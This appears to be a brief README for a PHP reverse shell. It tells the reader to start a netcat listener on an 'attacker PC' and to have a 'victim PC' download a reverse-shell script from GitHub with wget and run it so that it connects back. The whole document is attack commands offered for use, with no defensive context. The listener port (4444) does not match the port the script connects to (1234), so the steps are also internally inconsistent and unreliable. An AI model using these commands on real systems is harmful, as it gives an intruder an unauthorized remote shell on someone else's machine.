# php-reverse-shell

Attacker PC wait for terminal
```shell
nc -l 127.0.0.1 4444
```

Victim PC download smart reverse shell and connect to Attack PC
```shell
wget -O php-smart-reverse-shell.php https://raw.githubusercontent.com/GramThanos/php-smart-reverse-shell/master/php-smart-reverse-shell.php
php ./php-smart-reverse-shell.php 127.0.0.1 1234
```
